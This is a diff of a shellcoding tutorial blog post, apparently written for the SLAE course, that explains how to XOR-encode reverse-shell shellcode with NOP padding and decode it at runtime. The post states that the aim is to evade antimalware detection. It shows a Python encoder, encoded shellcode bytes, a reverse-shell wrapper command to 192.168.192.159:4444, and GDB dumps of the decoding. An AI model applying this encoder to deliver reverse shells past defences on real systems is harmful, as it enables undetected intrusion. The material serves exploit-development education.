@@ -1,7 +1,7 @@
 ---                                                                                                                                                                                                                                       
 title: Custom Encoder
 author: Stipe Marinovic
-date: 2020-06-11 22:00:00 +0800                                                                                                                                                                                                           
+date: 2020-06-10 22:00:00 +0800                                                                                                                                                                                                           
 categories: [Blogging, Tutorial]                                                                                                                                                                                                          
 tags: [slae, shellcoding]                                                                                                                                                                                                                 
 toc: true                                                                                                                                                                                                                                 
@@ -11,14 +11,15 @@ toc: true
 ## Introduction ##
 
 Sending well known shell code to target machine would most probably be detected by antimalware solution . 
-One way to bypass antimalware detection is to encode shell code and to have higher chances for sucessful bypass, custom encoder should be created and used. 
+One way to bypass antimalware detection is to encode shell code and to have higher chances for sucessful bypass, custom encoder should be created and used.  
 In this blog post we will go thru process of creating simple encoder and decored. 
-As an example we will preform XOR operation on every shell code byte with 0x0F value (key) and add NOP instrunction after every encoded shell code byte. This endocer will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
+As an example we will preform XOR operation on every shell code byte with value ```0x0F``` (encoding key) and add NOP (```\x90```) instrunction after every encoded shell code byte. 
+This endocer will double shell code size which can be tricky if buffer space is small but for educational purposes we can ignore that. 
 During decoding procedure, XOR operation will be preformed to restore original shell code and NOP instructions will be ignored.  
 
 ## Shell code ##
 
-We can use reverse shell code and wrapper form previous [blog post](https://smarinovic.github.io/posts/Reverse-shell/) which establishes connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 
+We can use reverse shell code and wrapper form previous [blog post](https://smarinovic.github.io/posts/Reverse-shell/) which tries to establish connection to defined remote address at defined port (in our case IP address is 192.168.192.159 and port is 4444). 
 
 ```
 python wrapper.py 192.168.192.159 4444
@@ -27,8 +28,8 @@ python wrapper.py 192.168.192.159 4444
 
 ## Encoding shell code ##
 
-Once we get shell code, we will use following python script to read thru defined bytearray (shell code opcodes) and preform XOR operation with 0x0F key. 
-NOP (\x90) will be injected after every encoded byte. 
+Once we get opcodes for encoded shell code, we will use following python script to read thru defined bytearray (shell code opcodes) and preform XOR operation with ```0x0F``` key. 
+After XOR opration, NOP (```\x90```) will be injected after every encoded byte. 
 ```
 #!/usr/bin/python
 import sys
@@ -57,8 +58,8 @@ Encoded shellcode: 0x3e,0x90,0xcf,0x90,0x3e,0x90,0xd4,0x90,0x3e,0x90,0xc6,0x90,0
 
 ## Decoder ##
 
-To sucessfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with defined key 0x0F. 
-Every other byte will be skipped as it is NOP instrunction. We will use: 
+To sucessfuly decode encoded shell code, we need to preform XOR operation for every shell code byte with previously defined key ```0x0F```. 
+Every other byte will be skipped as it is NOP (```0x90```) instrunction. We will use following registers for decoding: 
 * EAX for XOR operations
 * ECX as counter for decoding stub
 * EDX as pointer to beggining of encoded (and later decoded) shell code
@@ -143,8 +144,8 @@ int main()
 }
 ```
 
-By stepping thu program with GDB we can observe shell code decoding. 
-At the beggining of decoding stub we can see that ESI register is pointing to the beggining of encoded shellcode (memory address: ```0x404067```). 
+By stepping thu program with GDB we can observe shell code decoding. ESI register is used for storing pointer to beggining of encoded shellcode.  
+At the beggining of decoding stub we can see that ESI register is pointing to the beggining of encoded shellcode which is located at memory address: ```0x404067```. 
 
 ```
 gdb-peda$ info register esi
@@ -152,7 +153,7 @@ esi            0x404067            0x404067
 ```
 
 So in order to observe decoing, we will monitor first 10 bytes starting at ```0x404067``` memory address.
-At beggining address contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)
+Before decoding starts we can see that memory address ```0x404067``` contain encoded shell code (0x3e, 0x90, 0xcf, 0x90, 0x3e, 0x90 ...)
 
 * Initial data on address ```0x404067```  
 
@@ -163,22 +164,23 @@ gdb-peda$ x/10b 0x404067
 ```
 
 * content of the same address after few itterations:  
-We can see that 0x3e is decoded to 0x31 (XOR 0x0F, 0x3e = 0x31) and 0x90 is ignored and overwritten.
+We can see that ```0x3e``` is decoded to ```0x31``` (which is result of following instruction ```XOR 0x0F, 0x3e```) and ```0x90``` is ignored and overwritten.
 
 ```
 gdb-peda$ x/10b 0x404067
 0x404067 <shellcode+39>:        0x31    0xc0    0x31    0xdb    0x31    0x90    0xd4    0x90
-0x40406f <shellcode+47>:        0x3e    0x90
+ decoded 1st opcode-------------^^^^
+ NOP is ignored and replaced -----------^^^^
 ```
 
 * content of the same address after some more itterations:  
-We can see that decoded shell code doesn't not contain added NOPs and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.) and it has overwritten original encoded opcodes:
+We can see that decoded shell code does not contain added NOPs (```0x90```) and that all opcodes are XORed (0x3e XOR 0f = 0x31, 0xcf XOR 0x0f = 0xc0, etc.). Decoded opcodes overwrites original encoded opcodes:
 ```
 gdb-peda$ x/10b 0x404067
 0x404067 <shellcode+39>:        0x31    0xc0    0x31    0xdb    0x31    0xc9    0x31    0xd2
 0x40406f <shellcode+47>:        0x31    0xf6
 ```
 
-## Result ##
+## Testing reverse shell ##
 
-![Custom decoder working](https://smarinovic.github.io/assets/img/slae_00017.png)
+![Custom decoder working](https://smarinovic.github.io/assets/img/slae_00018.png)
